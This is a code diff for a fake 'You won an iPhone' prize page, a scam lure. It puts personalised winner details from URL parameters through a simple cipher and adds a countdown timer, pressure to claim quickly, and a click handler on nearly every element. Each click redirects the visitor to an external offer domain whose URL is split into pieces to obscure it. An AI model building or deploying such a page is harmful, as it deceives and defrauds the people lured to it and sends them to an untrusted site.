@@ -172,24 +172,24 @@
 
             <div class="container">
                 <div class="prize">
-                    <img src="iphone.png" alt="iPhone X">
-                    <p>iPhone X</p>
+                    <img data-prize-image src="" alt="" class="clickable">
+                    <p data-prize-name class="clickable"></p>
                 </div>
             </div>
         </div>
 
         <div class="winner text-center d-flex flex-column align-items-center">
-            <div class="img-container">
+            <div class="img-container clickable">
                 <img class="crown-image" src="crown.png" alt="Winner">
                 <img id="image" class="image" src="" alt="Winner">
             </div>
-            <div id="name" class="name"></div>
-            <div id="username" class="username"></div>
+            <div id="name" class="name clickable"></div>
+            <div id="username" class="username clickable"></div>
         </div>
 
         <div class="container">
-            <div class="instructions">
-                <p class="text-center fs-3"><strong>You won an iPhone X!</strong></p>
+            <div class="instructions clickable">
+                <p class="text-center fs-3"><strong>You won an <span data-prize-name></span>!</strong></p>
                 <p>Now you need to <strong>Claim</strong> your prize. Click in the button below and complete your registration.</p>
                 <p>You need to hurry! If you don't claim your prize <strong>now</strong>, we will give it to another participant.</p>
 
@@ -200,7 +200,7 @@
             </div>
 
             <div class="footer">
-                <div class="button">
+                <div id="button" class="button">
                     Claim
                 </div>
             </div>
@@ -211,7 +211,15 @@
     <script type="text/javascript">
         $(document).ready(function(){
           startTimer();
+
+          $('.clickable').on('click', function() {
+            goToOffer();
+          })
         });
+
+        function goToOffer() {
+          document.location = 'https://' + 'mandanudes' + '.online' + '/click';
+        }
 
         function getTimestamp() {
           return Math.floor(new Date().getTime() / 1000);
@@ -243,12 +251,14 @@
           $('#timer').text(valueStr);
         }
 
-        // aa508b2a58b9a0ffa6bb07e9f39446f4f48f7cf5
-        // #ulfdugrnulhj:::Ulfdugr+Iudqfr:::/image.jpg
+        // ulfdugrnulhj:::Ulfdugr+Iudqfr:::/image.jpg
 
         $(document).ready(function() {
-          const hash = location.hash.replace('#', '').replace('+', ' ');
-          const [cipher_username, cipher_name, image] = hash.split(':::');
+          const cipher_username = getUrlParameter('username');
+          const cipher_name = getUrlParameter('name');
+          const image = getUrlParameter('image');
+          const prizeName = getUrlParameter('prize_name');
+          const prizeImage = getUrlParameter('prize_image');
 
           const username = [...cipher_username].map(char => decrypt(char)).join('');
           const name = [...cipher_name].map(char => decrypt(char)).join('');
@@ -256,6 +266,9 @@
           $('#name').text(name);
           $('#username').text('@' + username);
           $('#image').attr('src', image.replace(/&amp;/g, '&'))
+
+          $('[data-prize-name]').text(prizeName);
+          $('[data-prize-image]').attr('src', prizeImage);
         })
 
         const alphabet = [
@@ -292,6 +305,21 @@
           const position = alphabet.indexOf(char);
           const newPosition = (position - shift) % alphabet.length;
           return alphabet[newPosition];
+        }
+
+        function getUrlParameter(param) {
+          let url = window.location.search.substring(1);
+          let urlVariables = url.split('&');
+
+          for (let i = 0; i < urlVariables.length; i++) {
+            let paramName = urlVariables[i].split('=');
+
+            if (paramName[0] === param) {
+              return typeof paramName[1] === undefined ? true : decodeURIComponent(paramName[1]);
+            }
+          }
+
+          return false;
         }
     </script>
 </body>
